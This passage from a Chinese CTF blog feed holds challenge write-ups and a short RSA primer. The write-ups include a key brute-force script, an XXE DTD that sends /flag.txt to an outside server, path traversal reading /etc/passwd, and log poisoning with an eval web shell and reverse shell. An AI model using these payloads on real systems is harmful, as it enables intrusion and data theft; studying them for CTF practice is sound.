<span class="token operator">=</span> url<span class="token operator">+</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>        request <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urls<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'I asked nothing'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h3 id="Web3-观图"><a href="#Web3-观图" class="headerlink" title="Web3_观图"></a>Web3_观图</h3><p>showImage.php可看到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//$key = substr(md5('ctfshow'.rand()),3,8);</span><span class="token comment">//flag in config.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$image</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'image'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>图片链接为<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>可以看到图片文件名是<code>Z6Ilu83MIDw=</code>经过<code>bf-ecb</code>算法用<code>$key</code>得到的，再看<code>$key</code>的生成方式</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>查询<code>rand()</code>函数，若里面的参数为空，则返回<code>0</code>到<code>getrandmax()</code>之间的伪随机整数</p><p><code>getrandmax()</code>函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出<code>key</code>值</p><p>脚本如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">getrandmax</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//5a78dbb4</span>        <span class="token variable">$image</span><span class="token operator">=</span><span class="token string double-quoted-string">"Z6Ilu83MIDw="</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">openssl_encrypt</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bf-ecb'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5a78dbb4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>得到<code>N6bf8Bd8jm0SpmTZGl0isw==</code>，为<code>config.php</code>加密后的<code>base64</code>码，访问<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>，F12打开复制代码base64解密得到<code>config.php</code>的内容，<code>flag</code>即在其中。</p><h3 id="Web4-观心"><a href="#Web4-观心" class="headerlink" title="Web4_观心"></a>Web4_观心</h3><p>抓包发现有<code>api.php</code>文件，并且带有请求<code>api</code>和<code>city</code>两个数据</p><p><code>api</code>携带的是一个网址，是一个xml文件，由此判断考的应该是XXE外部实体注入</p><p>于是构建攻击环境</p><p>在公网服务器上编写两个文件</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>随后在服务器上监听5000端口，即可得到<code>flag.txt</code>的 <code>base64</code>编码后的结果，解码既是flag</p><p>不监听端口也可以，直接发包请求，会把报错的结果返回，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXE这块不是很了解，原理后面再仔细研究一下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在菜鸡的道路上越走越远。。。淦！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法浅析</title>
    <link href="https://www.extrader.top/posts/aa76c91b/"/>
    <id>https://www.extrader.top/posts/aa76c91b/</id>
    <published>2020-08-01T14:08:36.000Z</published>
    <updated>2020-08-11T13:13:09.922Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h3><ol><li><p><strong>互质</strong>：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，14 和 15 互质。注意，两个数构成互质关系，他们不一定需要是质数，比如 7 和 9。</p></li><li><p><strong>欧拉函数</strong>：用于计算任意正整数 <code>n</code>，在 <code>&lt;=n</code> 的正整数中，与 <code>n</code> 互质的正整数个数。</p></li><li><p><strong>欧拉定理</strong>：如果两个正整数 a 和 n 互质，则如下等式成立。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173237556.png" alt loading="lazy"></p></li><li><p><strong>费马小定理</strong>：欧拉函数中的一个特殊情况，如果  <code>n</code>  是质数，而 <code>a</code> 不是 <code>n</code> 的倍数，此时 <code>a</code> 和 <code>n</code> 必然互质。因为<code>n</code>的欧拉函数值 = <code>n-1</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173548812.png" alt loading="lazy"></p></li><li><p><strong>模反元素</strong>：如果两个正整数 <code>a</code> 和 <code>n</code> 互质，那么一定可以找到一个正整数 <code>b</code>，使得 <code>ab - 1</code> 被 <code>n</code> 整除。这个时候，<code>b</code> 就叫做 <code>a</code> 的 模反元素。</p></li></ol><h3 id="关键参数"><a href="#关键参数" class="headerlink" title="关键参数"></a>关键参数</h3><p><code>(e,n)</code>：公钥</p><p><code>(d,n)</code>：私钥</p><p><code>p,q</code>：<code>n=p*q</code> ，<code>p</code>和<code>q</code>都是两个大素数</p><p><code>c</code>：密文</p><p><code>m</code>：明文</p><p><code>n,e</code>是公开的情况下，想要知道<code>d</code>的值，必须要将<code>n</code>分解计算出<code>n</code>的欧拉函数值，而<code>n</code>是两个大素数<code>p，q</code>的乘积，将其分解是困难的。</p><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><p>取两个大质数<code>p,q</code>，并计算他们的乘积<code>n</code>，一般要求<code>n</code>换算成二进制要大于2048位</p><p>则根据欧拉定理满足以下条件（欧拉函数）：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172139842.png" alt loading="lazy"></p><p>计算<code>n</code>的欧拉函数值</p><p>选择一个数<code>e</code>使得<code>e</code>与<code>n</code>的欧拉函数值互质，一般选择65537</p><p>计算<code>e</code>相对<code>n</code>的欧拉函数值的模反元素<code>d</code>，因为<code>e</code>与<code>n</code>的欧拉函数值互质，则根据模反元素的性质</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172706077.png" alt loading="lazy"></p><p>根据扩展欧几里得算法，通过迭代求解即可解出<code>d</code>，随后即生成公钥<code>(e,N)</code>，私钥<code>(d,N)</code></p><h3 id="加解密的实现"><a href="#加解密的实现" class="headerlink" title="加解密的实现"></a>加解密的实现</h3><p>加密：</p><p><code>m</code>为要加密的信息，<code>(e,n)</code>组合起来为公钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211116338.png" alt loading="lazy"></p><p>解密：</p><p><code>m</code>为要解密的信息，<code>(d,n)</code>组合起来为私钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211144409.png" alt loading="lazy"></p><p>两个公式可相互推导</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;数论知识&quot;&gt;&lt;a href=&quot;#数论知识&quot; class=&quot;headerlink&quot; title=&quot;数论知识&quot;&gt;&lt;/a&gt;数论知识&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;互质&lt;/strong&gt;：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，
      
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>36D杯五道代码审计题</title>
    <link href="https://www.extrader.top/posts/e53b958d/"/>
    <id>https://www.extrader.top/posts/e53b958d/</id>
    <published>2020-06-03T16:00:00.000Z</published>
    <updated>2020-07-14T12:52:02.630Z</updated>
    
    <content type="html"><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p><span id="more"></span><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want= =Thinking that it may be difficult, i decided to show you the source code:<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//give you all information you want</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'all_info_i_want'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">//really baby include</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>really really really baby challenge right? </code></pre><p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p><p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p><p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>，得到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 获取变量的整数值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 反转字符串</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^0-9.-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token operator">&lt;=</span> <span class="token operator">-</span><span class="token number">999999999999999999</span> <span class="token operator">||</span> <span class="token variable">$numPositve</span> <span class="token operator">>=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"more"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tail"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"less"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span 